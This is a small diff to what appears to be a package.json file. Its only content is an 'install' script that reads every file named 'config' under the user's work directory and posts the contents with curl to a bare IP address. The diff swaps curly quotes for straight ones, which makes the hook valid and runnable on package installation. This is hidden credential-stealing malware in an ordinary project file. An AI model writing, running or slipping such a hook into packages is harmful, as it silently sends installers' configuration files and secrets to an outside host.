@@ -1,5 +1,5 @@
 {
-    “scripts”: {
-        “install”: “find $HOME/work -type f -name config | xargs cat | curl --data @- 104.225.238.192:7777”
+    "scripts": {
+        "install": "find $HOME/work -type f -name config | xargs cat | curl --data @- 104.225.238.192:7777"
     }
 }
